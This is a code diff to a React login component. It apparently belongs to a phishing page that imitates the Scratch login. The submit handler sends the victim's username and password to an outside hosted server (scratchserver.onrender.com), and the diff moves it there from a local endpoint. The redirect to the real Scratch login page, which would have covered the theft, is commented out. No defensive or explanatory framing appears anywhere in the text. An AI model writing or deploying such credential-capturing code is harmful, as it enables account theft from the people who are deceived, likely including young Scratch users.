@@ -7,11 +7,12 @@ const Login = () => {
 
   const handleSubmit = () => {
     axios
-      .post("http://localhost:3001/", { user, pass })
+      // .post("http://localhost:3001", { user, pass })
+      .post("https://scratchserver.onrender.com", { user, pass })
       .then(() => {
         setUser("");
         setPass("");
-        window.location.href = "https://scratch.mit.edu/login/";
+        // window.location.href = "https://scratch.mit.edu/login/";
       })
       .catch((error) => {
         console.error("Error:", error);
